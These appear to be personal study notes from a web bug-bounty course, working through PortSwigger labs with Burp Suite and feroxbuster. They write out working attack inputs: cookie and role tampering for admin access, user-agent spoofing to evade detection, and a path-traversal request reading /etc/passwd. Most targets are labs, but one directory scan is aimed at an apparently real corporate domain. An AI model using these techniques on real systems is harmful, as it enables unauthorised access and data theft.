###########BURP SUITE ALTERNATIVES#######
Burp Suite Alternatives 
Netsparker
Acunetix
OWASP ZAP
ImmuniWeb
Veracode
Metaspoilt
Tenable Nessus
Qualys Web Application Scanner
Intruder
IBM Security QRadar
##############
a) Information Disclosure Vulnerabilities
b) Broken Access Control Vulnerabilities
c) Injection Vulnerabilities
#####################

1) Bug Hunting
-> The goal of bug hunting is to discover bugs 
in a target application or a website 

-> eg of bugs 
Information disclosure, Broken access control,
Injection vulnerabilities 


2) Bug Hunting
-> Chose Targets
-> Discover bugs 
-> Report 

Advantages:
you can choose the target
You choose your hours 
You choose the bugs


3) Penetration Testing:
-> One Target 
-> Goal of pen testing is to Hack the Target 

As part of pentesting:
a) We discover bugs and vulnerabilities and 
b) exploit it 


3) Information Disclosure Vulnerabilities 
-> This falls under the cryptographic failure category 
in the OWASP top10 
-> Cryptographic failures is the second most 
common security threat 

OWASP:
-> Independent non profit organizaiton that is 
concerned about websecurity 
-> Based on the data they have, they have rated the most 
common bugs and vulnerabilities 


-> Information disclosure helps us to access 
information that should have been not visible to you 

4)  Information disclosure : discover database credentials using robots.txt 
 https://portswigger.net/
-> portswigger offers a large number of 
vulnerable websites  
-> These are websites that have bugs for you to 
practice hacking on legally and safely 
-> burpsuite was also created by portswigger

a) Information disclosure :

https://portswigger.net/web-security/information-disclosure

https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files

b) go to Access lab and it will go to this url:https://0ae400ee04d099858169d431005f0023.web-security-academy.net/

c) Here append url with robots.txt and access the url 

######robots.txt############
robots.txt is telling google and other search engines not to index, whatever data that in included in Disallow:/backup, here it is in backup path 

eg:
User-agent: *
Disallow: /backup

Here whenever user enters * , i want to disallow, i.e i dont want to load whatever is stored in the backup path. 

########################

https://0ae400ee04d099858169d431005f0023.web-security-academy.net/robots.txt

-> it gives this output :
User-agent: *
Disallow: /backup

d) Now try to access /backup using this url: https://0ae400ee04d099858169d431005f0023.web-security-academy.net/backup

it gives this output:

Index of /backup
Name	Size
ProductTemplate.java.bak	1647B


e) When we click: ProductTemplate.java.bak	1647B, we will be able to access java file which makes db connections 

eg:
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "b9k4vvlpyxhuas11dy0oryfib07z1f1d"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}

f) So this is one way of seeing: information-disclosure via backup files 


5) Information disclosure: Discovering endpoints and Sensitive data 

a) To discover all hidden paths in a target domain - we dont have any direct way 
-> only way is to simply try whatever file names or 
directory names that we think of, and load it in url 
and see what it loads for us 
-> This process is time consuming

b) Hence we can use a tool which discovers all the 
hidden paths in a target domain 

c) There are lot of tools, which does this:

eg: 
FEROXBUSTER 
-> This tool can even help discover endpoints 




6) portswigger: information disclosure : infoleak in version control history 
https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history

lab: https://0a6a00e303d4f64e80800319003b0028.web-security-academy.net/

###FEROXBUSTER installation in windows :###

a) Install WSL: Windows subsystem for linux 
-> once wsl is installed, it helps us to run linux command on windows 
-> We install wsl because lot of hacking and bug hunting tools, work on linux 

eg:
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
C:\Users\Maheswaran>wsl --install
The requested operation requires elevation.
Installing: Virtual Machine Platform
Virtual Machine Platform has been installed.
Installing: Windows Subsystem for Linux
Windows Subsystem for Linux has been installed.
Installing: Windows Subsystem for Linux
Windows Subsystem for Linux has been installed.
Installing: Ubuntu
Ubuntu has been installed.
The requested operation is successful. Changes will not be effective until the system is rebooted.

C:\Users\Maheswaran>





eg:

 
-----> If installation fails, check if virtualization is enabled in windows machine 

i) in task manager -> performance tab -> we can virtualization enabled or disabled 


--> after enabling virtualization, install the required distro, here lets install ubuntu


#######
eg:
C:\Users\Maheswaran>wsl --list --online
The following is a list of valid distributions that can be installed.
Install using 'wsl.exe --install <Distro>'.

NAME                                   FRIENDLY NAME
Ubuntu                                 Ubuntu
Debian                                 Debian GNU/Linux
kali-linux                             Kali Linux Rolling
Ubuntu-18.04                           Ubuntu 18.04 LTS
Ubuntu-20.04                           Ubuntu 20.04 LTS
Ubuntu-22.04                           Ubuntu 22.04 LTS
OracleLinux_7_9                        Oracle Linux 7.9
OracleLinux_8_7                        Oracle Linux 8.7
OracleLinux_9_1                        Oracle Linux 9.1
openSUSE-Leap-15.5                     openSUSE Leap 15.5
SUSE-Linux-Enterprise-Server-15-SP4    SUSE Linux Enterprise Server 15 SP4
SUSE-Linux-Enterprise-15-SP5           SUSE Linux Enterprise 15 SP5
openSUSE-Tumbleweed                    openSUSE Tumbleweed

C:\Users\Maheswaran>wsl --install Ubuntu
Ubuntu is already installed.
Launching Ubuntu...
Installing, this may take a few minutes...
Please create a default UNIX user account. The username does not need to match your Windows username.
For more information visit: https://aka.ms/wslusers
Enter new UNIX username: root
adduser: The user `root' already exists.
Enter new UNIX username: mahesh
New password:
Retype new password:
passwd: password updated successfully
Installation successful!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.133.1-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This message is shown once a day. To disable it please create the
/home/mahesh/.hushlogin file.
mahesh@DESKTOP-IHLQLPQ:~$

#########
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

b) Once installed, we can use wsl by typing the following command:

wsl -u root
####
eg:
C:\Users\Maheswaran>wsl -u root
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.133.1-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This message is shown once a day. To disable it please create the
/root/.hushlogin file.
root@DESKTOP-IHLQLPQ:/mnt/c/Users/Maheswaran#

####


c) install unzip tool 

###
root@DESKTOP-IHLQLPQ:/mnt/c/Users/Maheswaran# apt install unzip
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Suggested packages:
  zip
The following NEW packages will be installed:
  unzip
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 174 kB of archives.
After this operation, 385 kB of additional disk space will be used.
Get:1 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 unzip amd64 6.0-26ubuntu3.1 [174 kB]
Fetched 174 kB in 2s (112 kB/s)
Selecting previously unselected package unzip.
(Reading database ... 24208 files and directories currently installed.)
Preparing to unpack .../unzip_6.0-26ubuntu3.1_amd64.deb ...
Unpacking unzip (6.0-26ubuntu3.1) ...
Setting up unzip (6.0-26ubuntu3.1) ...
Processing triggers for man-db (2.10.2-1) ...
root@DESKTOP-IHLQLPQ:/mnt/c/Users/Maheswaran#

###

d) curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash

eg:
root@DESKTOP-IHLQLPQ:/mnt/c/Users/Maheswaran# curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash
[+] Installing feroxbuster to /mnt/c/Users/Maheswaran!
[=] Found 64-bit Linux, downloading from https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-linux-feroxbuster.zip
[=] Installing Noto Emoji Font
bash: line 56: fc-cache: command not found
[+] Noto Emoji Font installed
[+] Installed feroxbuster
  [-] path: /mnt/c/Users/Maheswaran/feroxbuster
  [-] version: 2.10.1
root@DESKTOP-IHLQLPQ:/mnt/c/Users/Maheswaran#


e) Use feroxbuster for the target url: 

https://github.com/danielmiessler/SecLists

https://github.com/danielmiessler/SecLists/blob/89e486bd4e1bcd1bd3fc565216097a8d389f3983/Discovery/Web-Content/common.txt   - get full list of words 

-> Here we downloaded common.txt file from SecListss and stored locally in: /mnt/c/Users/Maheswaran


eg:


root@DESKTOP-IHLQLPQ:/mnt/c/Users/Maheswaran# ./feroxbuster  -u https://go2expo.expeditors.com/landing -w common.txt 
root@DESKTOP-IHLQLPQ:/mnt/c/Users/Maheswaran# ./feroxbuster  -u https://0a22005a034dafe68176751e00bf0009.web-security-academy.net/ -w common.txt 


-> actual grep from console:

##################

root@DESKTOP-IHLQLPQ:/mnt/c/Users/Maheswaran# ./feroxbuster  -u https://0a22005a034dafe68176751e00bf0009.web-security-academy.net/ -w common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://0a22005a034dafe68176751e00bf0009.web-security-academy.net/
 🚀  Threads               │ 50
 📖  Wordlist              │ common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       16l       29w      435c https://0a22005a034dafe68176751e00bf0009.web-security-academy.net/backup
404      GET        1l        2w       11c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[>-------------------] - 1s         9/4729    13m     found:1       errors:0
[>-------------------] - 2s         9/4729    14m     found:1       errors:0
[>-------------------] - 2s        10/4729    13m     found:1       errors:0
[>-------------------] - 2s        10/4770    13m     found:1       errors:0
[>-------------------] - 2s        10/4770    14m     found:1       errors:0
[>-------------------] - 2s        11/4770    13m     found:1       errors:0
[>-------------------] - 2s        11/4770    13m     found:1       errors:0
[>-------------------] - 2s        11/4770    14m     found:1       errors:0
[>-------------------] - 2s        12/4770    13m     found:1       errors:0
[>-------------------] - 2s        12/4770    13m     found:1       errors:0
[>-------------------] - 2s        13/4770    12m     found:1       errors:0
[>-------------------] - 2s        13/4770    12m     found:1       errors:0
[>-------------------] - 2s        14/4770    11m     found:1       errors:0
[>-------------------] - 2s        14/4770    11m     found:1       errors:0
[>-------------------] - 2s        15/4770    10m     found:1       errors:0
[>-------------------] - 2s        15/4770    10m     found:1       errors:0
[>-------------------] - 2s        16/4770    10m     found:1       errors:0
[>-------------------] - 2s        16/4770    10m     found:1       errors:0
200      GET       52l      108w     1515c https://0a22005a034dafe68176751e00bf0009.web-security-academy.net/resources/labheader/js/labHeader.js
[>-------------------] - 2s        63/4770    2m      found:1       errors:0
200      GET       28l       81w     1175c https://0a22005a034dafe68176751e00bf0009.web-security-academy.net/resources/labheader/js/submitSolution.js
[>-------------------] - 2s        63/4770    2m      found:1       errors:0
[>-------------------] - 3s        64/4770    4m      found:3       errors:0
[>-------------------] - 3s        65/4770    4m      found:3       errors:0
200      GET      457l     2830w   306891c https://0a22005a034dafe68176751e00bf0009.web-security-academy.net/image/productcatalog/products/8.jpg
[>-------------------] - 3s        65/4770    4m      found:3       errors:0
[>-------------------] - 4s        65/4770    5m      found:4       errors:0
[>-------------------] - 4s        66/4770    5m      found:4       errors:0
200      GET      645l     3930w   387227c https://0a22005a034dafe68176751e00bf0009.web-security-academy.net/image/productcatalog/products/72.jpg

##################

7) Upon wsl -u root it shows the below:

C:\Users\Maheswaran>wsl -u root
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.133.1-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This message is shown once a day. To disable it please create the
/root/.hushlogin file.
root@DESKTOP-IHLQLPQ:/mnt/c/Users/Maheswaran# 

---> /mnt/c/Users/Maheswaran of wsl  corresponds to C:\Users\Maheswaran of windows

8) Manipulating application behaviour through HTTP get method:
-> In this chapter we will be learning HTTP methods and methodology of hacking them 

a) Target website for learning:
https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages

b) Consider a website with query param:

https://target.com/index.php?from=value

-> Here value will be sent to server as http get
method 
-> target website will process the value and hence
we can manipulate this value to manipulate this 
application 

c) In our target website, if we enter correct values, it shows 
the corresponding page or image 


https://0a3a00c303cff8c2811d072b00a4000a.web-security-academy.net/product?productId=2


d) Now if we give a very high value which does not exist,  server will throw error 
https://0a3a00c303cff8c2811d072b00a4000a.web-security-academy.net/product?productId=2455666666666666666


error:

Internal Server Error: java.lang.NumberFormatException: For input string: "2455666666666666666"
	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
	at java.base/java.lang.Integer.parseInt(Integer.java:661)
	at java.base/java.lang.Integer.parseInt(Integer.java:777)
	at lab.j.k.d.s.I(Unknown Source)
	at lab.y.w7.q.i.u(Unknown Source)
	at lab.y.w7.r.p.y.P(Unknown Source)
	at lab.y.w7.r.a.lambda$handleSubRequest$0(Unknown Source)
	at s.x.f.z.lambda$null$3(Unknown Source)
	at s.x.f.z.S(Unknown Source)
	at s.x.f.z.lambda$uncheckedFunction$4(Unknown Source)
	at java.base/java.util.Optional.map(Optional.java:260)
	at lab.y.w7.r.a.v(Unknown Source)
	at lab.server.q.o.dn.M(Unknown Source)
	at lab.y.w7.d.h(Unknown Source)
	at lab.y.w7.d.M(Unknown Source)
	at lab.server.q.o.b.y.W(Unknown Source)
	at lab.server.q.o.b.c.lambda$handle$0(Unknown Source)
	at lab.j.l.d.s.H(Unknown Source)
	at lab.server.q.o.b.c.d(Unknown Source)
	at lab.server.q.o.r.P(Unknown Source)
	at s.x.f.z.lambda$null$3(Unknown Source)
	at s.x.f.z.S(Unknown Source)
	at s.x.f.z.lambda$uncheckedFunction$4(Unknown Source)
	at lab.server.r.l(Unknown Source)
	at lab.server.q.o.r.k(Unknown Source)
	at lab.server.q.b.i.D(Unknown Source)
	at lab.server.q.t.J(Unknown Source)
	at lab.server.q.m.J(Unknown Source)
	at lab.server.z6.l(Unknown Source)
	at lab.server.z6.l(Unknown Source)
	at lab.l.r.lambda$consume$0(Unknown Source)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642)
	at java.base/java.lang.Thread.run(Thread.java:1583)

Apache Struts 2 2.3.31


-> by digging more on error we can understand 
that it is a java based application and it uses 
Apache Struts 

e) Other examples of sending data via HTTP get method:


https://target.com/index.php?from=value
https://target.com/index.jsp?from=value
https://target.com/index?from=value
https://target.com/?from=value

9) Manipulating application behaviour through HTTP POST method:

a) While get is used to retrieve information, post is used to 
submit input boxes information

b) Best way to intercept the data that is sent to 
backend through http post method is by using using 
proxy 

c) Essentially we will have a web proxy running and have our browser 
submitting all the requests through this proxy , using which 
we can analyse the data, modify it and then send the 
modified request to the webserver or web application 
that is running on the cloud 


d) We will be using tool Burp suite 
-> Burp suite is pre-installed in hacking operating 
systems such as kali-linux and parrot-linux 


e) Install Burp suite community edition from: https://portswigger.net/burp/releases/professional-community-2023-12-1-5
-> After installing, load burp suite with default settings 
---> This will lead us to the dashboard of BurpSuite 


10) 

-> Until now we have installed BurpSuite. Now we will be 
using its proxy functionality to intercept requests before they go to the 
web application 
-> As a result we will be able to see and manipulate 
inputs which cannot be done via url or browser 
-> THus using this tool, increases our chances of 
finding more bugs or vulnerabilities in the target 
application 


a) We have proxy tab in burpsuite

---> Here interceptor is the proxy 
-> When interceptor is turned on, 
requests sent by Burp's browser are held here 
so that you can analyze and modify them before 
forwarding them to the target server.

b) in burpsite , if intercept is turned on we can see the 
raw request and also if it is stuck we can 
move forward 
-> burpproxy will stop the request and if we let it go, the request will be 
forwarded to the corresponding page from burp proxy

c) if we click drop, it will stop request from reaching the final 
destination 


11) To bypass security -? 
-> sometimes when we load the page, we will be blocked in 
burp proxy browser several  times during 
intercept is on. 
-> To bypass this we can go to: Proxy -> Proxy settings -> Match and Replace rules 
--> Remove --> Enabled 

-> Here User Agent will be replaced with User-Agent of Mozilla 
-> By this website will think that we are not using any 
security tools like burpsuite

eg: 
i) POST request
-> if we go to page: https://zsecurity.org/
--> in burpsuite we can go down and if we click 3, it will 
lead us to the post request as seen below:

POST /wp-admin/admin-ajax.php HTTP/2

action=pagination_request&sid=5f10a8b5u7&unid=&page=3&lang=&ajax_nonce=e2bfd8f7c8&custom_data%5Bsf_taxo%5D=%7B%7D&custom_data%5Bsf_opera%5D=%7B%7D

-> Just by simply modifying any of the parameters above we can find 
vulnerabilities of target application server 

ii) get request url and parameters 

urL:https://zsecurity.org/checkout/

Parameters in burp proxy:
GET /captcha/v1/23190cf/static/hcaptcha.html?_v=8wpiowmkecx HTTP/2


12) Broken Access Control Vulnerabilities: BAC
a) In OWASP top10 list, this is the most common 
security threat and  94% of the websites tested will be vulnerable to some sort of
broken access control vulnerability 
b) Broken access control has a number of sub categories 
such as : 
i) Path Traversal 
ii) CSRF iii) IDOR etc 
c) BAV is a general term which encapsulates any bug or 
vulnerability, that helps us to access/modify data 
beyond limits 
d) Platforms like Uber, shoppify , github are vulnerable 
to such vulnerabilities 


13) What is Broken Access COntrol: cookie manipulation: 1
Target site:https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter
a) Access or modify information beyond 
limits or permissions 

-> Access or modify user info without logging in 
-> Access or modify info that belongs to another user 


b) Target website: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter


c) in case you want to change your cookie parameter, we can 
do via Match/Replace rule of burp proxy

d) goto -> Proxy Settings-> Add Match/replace rule 

in match: Admin=false
replace: Admin=true 


e) this proxy settings will work even if the interceptor is turned off 


14) BAC - Accessing private user data :2
Target site: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids
a) To test this, create two accounts 
James Bond -> james@bing.com -> France
John Wick -> jhn@gmail.com-> Ireland

-> In target website, based on account info entered, it will 
render appropriate information for that account

b) As part of this test, we will check if we are 
logged in one of the accounts, are we able to access 
the information of the other account. 
-> if the website is designed such that these kind of 
access is prevented , then there is no access control 
vulnerability
-> on the vice versa, if one user is able to access 
other user's account information, then we have 
discovered access control vulnerability


15) Broken Access Control - Discovering IDOR Vulnerabilities(Insecure Direct Object Reference) :3
Target site: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references
a) IDOR - Insecure Direct Object Reference 
-> Objects are accessed directly based on User input 

b) When application directly accesses user data without verification 
on user input 
-> Thus by manipulating user input, we can directly 
retrieve data that does not belong to us. 
-> SInce we are able to see and manipulate data 
that does not belong to us, IDOR falls under BAC
-> Here object means any type of data . eg: docs, images, db 
records etc 
c)  Here just by changing id, if we are able to retrieve
other person's information, then its called IDOR 

eg: 
target.com!id=1

James Bond
james@bing.com
France


target.com?id=2
jhn@gmail.com
Ireland 

d) Project for IDOR: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references
link for lab: https://www.udemy.com/course/learn-bug-bounty-hunting-web-security-testing-from-scratch/learn/lecture/32970042#overview



16)BAC: Privilege Escalation with Burp Repeater:4

a) Target website:
https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

Target lab: https://0a8f0091041e42d784cd648f002a0004.web-security-academy.net/


b) Repeater is used for sending the request and then getting the response back 

c) How to use repeater
1) First in proxy tab, turn intercept on
2) In browser send the request and in proxy tab, 
we can see the request being sent 
3) THen right click and send to repeater
4) Now the request data will be send and we will be 
able to see the response 


d) Thus by using repeater we can send request and 
get back response 

e) In repeater we can change data like this:

Request:
POST /my-account/change-email HTTP/2
Host: 0a8f0091041e42d784cd648f002a0004.web-security-academy.net
Cookie: session=wz9c9uPFMKwbPR2imvGctzROwT1nfXv6
Content-Length: 43
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://0a8f0091041e42d784cd648f002a0004.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8f0091041e42d784cd648f002a0004.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

{"email":"indian@test.com",
"roleid":1
}


Response:
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 119

{
  "username": "wiener",
  "email": "indian@test.com",
  "apikey": "3nkXzqQqKyjqCHFrdMvzQcxcx6aaW4JI",
  "roleid": 1
}


f) Primarily if we change the roleid to some one who 
has higher privileges, we will be able to 
go to higher roles like admin using this methodology 


17) BAC: Debugging flows with HTTP trace and 
gaining admin access :5
a) HTTP trace helps in understanding how the target application works 
b) Target resource and application:
https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

Target lab:
https://0a31003f04837819803a761600180028.web-security-academy.net/

c) Now upon launching target lab with link for admin, it will throw message saying 
Admin interface only available for local users :

https://0a31003f04837819803a761600180028.web-security-academy.net/admin

eg: request
GET /admin HTTP/2
Host: 0a31003f04837819803a761600180028.web-security-academy.net
Cookie: session=V7IRV9YqiqIZKak2YgZAKzwLWk3pB03k
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

-> Upon investigating we can find only sessionid information in inspector 


d) Now we will send same request again:
But instead of GET we will send TRACE request 

-> TRACE methods helps in understanding how the 
target application works 
i) THis is because when we send a trace to the target 
server - target server responds by simply sending us back 
the request we send to it. 

ii) THis is useful because it helps us to understand
whether the data we sent got modified at any stage

-> THis is because the data which we sent, gets passed through 
a number of nodes like proxy etc before it reaches the target server 
-> THese nodes can modify the original request we sent 
eg: end request we get could contain some extra headers and 
extra data 
-> This extra information could be used by target server to
identify or treat you differently 


eg:

a) Request at client:

TRACE /admin HTTP/2.0
HOST: webserver.com
cookie: session=c4m

.....
connection: close 


b) Proxy 


c) Target webserver 

TRACE /admin HTTP/2.0
HOST: webserver.com
cookie: session=c4m

.....
Extra Headers 
connection: close 

-> Here we can see that the end request what target 
web server receives contains extra headers 
-> This extra information could be used by target server to
identify or treat you differently 


e) Hence when we send the trace request, the webserver is going 
to send us back the request that it received , after it got modified 

18 BAC: Path/Directory Traversal vulnerabilities:5
a) It helps to access path/locations on the target webserver where you are not allowed to access 
-> This vulnerability is BAC since it allows us to access paths/locations that beyond our limits 

b) To see about Patch/Directory Traversal vulnerability
-> lets see a file system in linux 
i) Here / is the root or base directory in our file system
ii)In /home we have the user data 
iii) In /etc we will have configuration files for the various programs installed on our system 




 /
|
|
 ------/var
|
|
 ------/home
|
|
 ------/etc
 
 
c) When you install  a webserver - we basically define a certain path where the website files will be stored 
-> That path is usally /var/www/html 
-> Idea here is, we will define a path in your file system, which contains the files of the website and when user access the website - users are served with files 
that are included in this directory: /var/www/html 
-> This directory /var/www/html will be called as WEBROOT 
-> WEBROOT can be anywhere, but this is one of the default paths where the webroot is 

 /
|
|
 ------/var/www/html 
|
|
 ------/home
|
|
 ------/etc


d) Directory or path traversal vulnerabilities allow us to breakout out of this path(/var/www/html) and load files from other 
locations on the server where we are not allowed to see. 

Resource link: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
Target lab: https://0a8f00e90469b25782bf65d800580001.web-security-academy.net/


e) On hitting target link , we will have list of products and lets select a product with interceptor turned off 
-> Once selecting a product, turn interceptor on and forward the request until you get this request:
GET /image?filename=34.jpg HTTP/1.1
-> Lets focus on this request, since this is the vulnerable one 
i) Once we get this request with image, we will send the request to repeater :
-> Turn off the interceptor and then using repeater send request and get the response. 
-> We will be able to see the image in the response 
ii) By this we can imagine that 34.jpg is stored somewhere in filesystem 

probably in : /var/www/html/images 

iii) Next we can check if we are able load any other file in the repeater 
iv)  Until now we have been loading files that were present in webroot:/ var/www/html

f) Next step is to load the file on target system i.e  /var or /home or /etc 
-> Configuration files  exists on every linux computer, hence we know for sure that it exists on the computer 

g) There a lot of default linux files we can access. one of them is /etc/passwd
-> It lists the users registered on this server 

eg:
[mahesh@GS1-MAHESWAR-LX etc]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:996:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin


h) Lets try to load the /etc/passwd by changing the original request:

Original request:
GET /image?filename=52.jpg HTTP/1.1
Host: 0af9003e03d78c1088fa077700df00e3.web-security-academy.net
Cookie: session=PuSf4eHNSJaVGE73DS1M9nsDfL4TyWL6
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0af9003e03d78c1088fa077700df00e3.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


Modified request for /etc/passwd:
GET /image?filename=/etc/passwd HTTP/1.1
Host: 0af9003e03d78c1088fa077700df00e3.web-security-academy.net
Cookie: session=PuSf4eHNSJaVGE73DS1M9nsDfL4TyWL6
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0af9003e03d78c1088fa077700df00e3.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

Response for Modified request:
HTTP/1.1 200 OK
X-Frame-Options: SAMEORIGIN
Content-Length: 2316
Content-Type: image/jpeg
Date: Wed, 21 Feb 2024 05:25:40 GMT
Via: 1.1 hk1-proxy01.corp.expeditors.com:80 (Cisco-WSA/11.8.1-023)
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
